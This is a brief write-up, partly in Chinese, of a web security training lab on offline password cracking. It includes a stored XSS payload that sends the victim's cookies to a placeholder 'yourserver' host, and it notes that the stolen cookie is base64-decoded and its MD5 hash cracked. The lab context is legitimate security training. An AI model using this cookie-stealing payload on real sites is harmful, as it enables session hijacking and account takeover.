# Lab: Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

* Your credentials: wiener:peter
* Victim's username: carlos

## Authentication
* 題目說要找出 carlos 的 stay-logged-in value，用 xss
```
<script>new Image().src = 'http://yourserver/exploit?' + document.cookie</script>
```
* 之後就可以拿到了，cookie 的架構跟上一題是一樣的，所以 base64 decode -> md5 decrypt 就有密碼了